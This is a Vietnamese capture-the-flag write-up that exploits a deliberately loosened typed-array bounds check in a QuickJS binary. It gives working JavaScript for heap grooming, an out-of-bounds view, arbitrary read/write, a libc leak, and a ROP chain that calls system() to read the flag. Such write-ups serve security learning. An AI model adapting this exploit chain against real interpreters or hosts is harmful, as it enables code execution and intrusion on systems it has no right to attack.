## Đề bài

> PWN#006 — 136 điểm. Lấy shell trên host từ xa và đọc flag.

Service là wrapper mỏng quanh QuickJS command-line interpreter. Nó đọc script từ connection, ghi vào /tmp/script.<random>.js rồi chạy qjs với file đó. Input được chia bằng dòng chỉ có ###RUN###: phần trước là script, phần sau được gửi vào stdin của process.

Handout kèm đúng binary qjs và runtime Debian glibc 2.42-13 dùng để build. Process remote chạy bằng nobody, cwd /challenge; flag ở /flag/flag.txt.

## Phân tích

### Phiên bản và build

qjs dùng PIE, NX bật, không có stack canary và đã strip — nhưng được link với -rdynamic, nên các symbol nội bộ JS_*/js_* vẫn export. Nhờ đó có thể dùng chính binary làm anchor cho ROP mà không cần leak libc base để định vị executable.

Build lại QuickJS upstream 2024-01-13 bằng cùng toolchain (Debian gcc 14.2.0-19) cho binary gần như giống hệt: sau khi chuẩn hóa branch target, mọi function trừ js_std_add_helpers và JS_NewCFunctionData đều khớp về kích thước và chuỗi instruction. Hai function ngoại lệ chỉ khác jump offset và NOP padding do layout địa chỉ nội bộ. Nói cách khác, challenge dùng bản 2024-01-13 với một thay đổi có chủ ý.

### Patch

Trong js_typed_array_constructor, bounds check của view trên ArrayBuffer có sẵn là:

```c
if ((offset + (len << size_log2)) > abuf->byte_length) {
invalid_length:
    return JS_ThrowRangeError(ctx, "invalid length");
}
```

Ở binary challenge, hằng số so sánh được nới thêm 0x1000:

```c
if ((offset + (len << size_log2)) > abuf->byte_length + 0x1000)
```

Vì vậy typed-array view có thể dài hơn backing store tối đa 4 KiB. QuickJS vanilla từ chối cấu trúc tương tự bằng RangeError: invalid length. Đây là lỗ hổng duy nhất cần cho exploit: new Uint8Array(abA, 0, 0x1800) chạy được với ArrayBuffer(0x800).

### Object layout

Build dùng các layout 64-bit thường thấy của QuickJS (đã kiểm chứng trong gdb với local build cùng source):

| Structure | Size | Field liên quan |
|---|---:|---|
| JSObject | 0x48 | u.array @ 0x30, u.array.u.ptr @ 0x38, u.array.count @ 0x40, class_id @ 0x6 |
| JSArrayBuffer | 0x30 | byte_length @ 0x0, detached @ 0x4, data @ 0x8 |
| JSTypedArray | 0x28 | obj @ 0x10, buffer @ 0x18, offset @ 0x20, length @ 0x24 |

Với typed array, JSObject.u.array.u.ptr trỏ tới element storage và u.array.count giữ element count. Ghi đè pointer này sẽ tạo primitive đọc/ghi 8 byte tùy ý qua elements của array.

### Environment trên remote

Wrapper không truyền --std, nên không có module std/os; chỉ tồn tại print, console và scriptArgs. import() vẫn đi qua module loader nhưng phản hồi syntax error quá nghèo để leak file. Do không có helper gc(), cần tạo object lớn rồi bỏ tham chiếu để buộc garbage collection.

## Lời giải

### 1. Heap grooming

Đầu tiên cấp phát 400 typed array nhỏ:

```js
let pad = [];
for (let i = 0; i < 400; i++) pad.push(new Uint8Array(8));
```

Thao tác này rút hết tcache của size class khoảng 0x20, khiến JSObject cấp phát sau đó nằm trong vùng heap mới ngay sau oversized view — bên trong cửa sổ OOB 4 KiB.

### 2. Dựng OOB window

```js
let abA = new ArrayBuffer(0x800);
new Uint8Array(abA).fill(0xaa);
let oob = new Uint8Array(abA, 0, 0x1800);   // accepted because of the +0x1000 patch
let probe0 = new Uint8Array(abA, 0, 0x1700);
```

oob bắt đầu tại abA->data và phủ 0x1800 byte: 0x800 byte thật của buffer cộng 0x1000 byte heap kế cận. probe0 là view thứ hai; JSObject của nó có u.array.u.ptr = abA->data và count = 0x1700. Scan OOB window tìm hai giá trị này sẽ cho địa chỉ tuyệt đối A của backing store.

```js
let A = 0n;
for (let i = 0; i < 0x1800 - 0x48; i++) {
    if (u32(i + 0x40) === 0x1700) {
        let q = u64(i + 0x38);
        if (q > 0x500000000000n && q < 0x600000000000n) { A = q; break; }
    }
}
```

### 3. Arbitrary read/write

Tạo buffer thứ hai cùng view trên đó, rồi tìm JSObject của view trong OOB window bằng count (0x500) và data pointer (Qt, phải nằm trong window và trỏ tới filler 0xcc):

```js
let tgt = new ArrayBuffer(0x500); new Uint8Array(tgt).fill(0xcc);
let tv  = new Uint8Array(tgt, 0, 0x500);

let Ot = -1, Qt = 0n;
for (let i = 0; i < 0x1800 - 0x48; i++) {
    if (u32(i + 0x40) === 0x500) {
        let q = u64(i + 0x38);
        if (q > A && q - A < 0x1800n && oob[Number(q - A)] === 0xcc) {
            Ot = i; Qt = q; break;
        }
    }
}
```

Ot là offset của JSObject của tv bên trong OOB window. Ghi vào oob[Ot + 0x38] sẽ đổi element pointer của tv; elements của tv từ đó alias địa chỉ mục tiêu:

```js
function rd64(a) { w64o(Ot + 0x38, a); let r = 0n; for (let i = 7; i >= 0; i--) r = (r << 8n) | BigInt(tv[i]); return r; }
function rd32(a) { w64o(Ot + 0x38, a); return (tv[0] | (tv[1] << 8) | (tv[2] << 16) | (tv[3] << 24)) >>> 0; }
function wr64(a, v) { w64o(Ot + 0x38, a); for (let i = 0; i < 8; i++) tv[i] = Number((v >> BigInt(8 * i)) & 0xffn); }
function restore() { w64o(Ot + 0x38, Qt); }
```

### 4. Leak libc

Cấp phát buffer 0x500 byte (big) giữa tgt và guard buffer, rồi bỏ tham chiếu. Allocation lớn new ArrayBuffer(0x4000000) kích hoạt GC; chunk 0x500 được đưa vào unsorted bin. Pointer fd/bk của nó — địa chỉ main_arena, tức libc + 0x1e7b20 và các offset lân cận — được ghi vào chunk data nằm trong OOB window.

Tính base bằng cách thử leaked pointer với các offset unsorted-bin đã biết, yêu cầu kết quả page-aligned và bốn byte đầu là ELF magic \x7fELF:

```js
const offs = [0x1e7b20n, 0x1e7b30n, 0x1e7b40n, 0x1e7b50n, 0x1e7b60n, 0x1e7b70n];
for (const [k, _] of freq.entries()) {
    let v = BigInt('0x' + k);
    for (const off of offs) {
        if (((v - off) & 0xfffn) !== 0n) continue;
        let b = v - off;
        if (b < 0x7f0000000000n || b >= 0x800000000000n) continue;
        if (rd32(b) === 0x464c457f) { libcBase = b; break; }
    }
}
```

### 5. Stack và return address

environ nằm ở libc + 0x1eee28. Đọc nó sẽ lấy stack pointer; saved return address của main (call site trong __libc_start_call_main) nằm ở environ - 0x128, tức libc + 0x29f75 trong build này. Có fallback scan 0x8000 byte phía dưới environ để xử lý khác biệt layout.

### 6. ROP

Command string được ghi vào OOB window tại A + 0x700, địa chỉ đã biết. Return slot nhận:

```text
[ret]            libc+0x2a9b8   (only if R & 0xf == 8, for 16-byte alignment)
[pop rdi; ret]   libc+0x2a9b7
[arg]            A+0x700
[system]         libc+0x54790
```

Sau đó script kết thúc, main return và chain chạy system("cat /flag/flag.txt").

## Ghi chú

* Chạy binary local bằng loader và libc đi kèm: ~/pwn006/ld-linux-x86-64.so.2 --library-path ~/pwn006 ~/pwn006/qjs exploit.js. Dùng system glibc (2.43) làm thay đổi main_arena và __libc_start_call_main nên các offset hardcode sẽ sai.
* Remote không có gc()/std/os. Cần trigger GC bằng allocation lớn.
* Phải tạo oob trước các target JSObject; cửa sổ 4 KiB chỉ đủ tới các object được cấp phát ngay sau backing store.
* Arbitrary read/write qua tv mỗi lần 8 byte; luôn khôi phục Qt trước khi cấp phát object khác, nếu không engine có thể dereference element pointer sai khi GC.
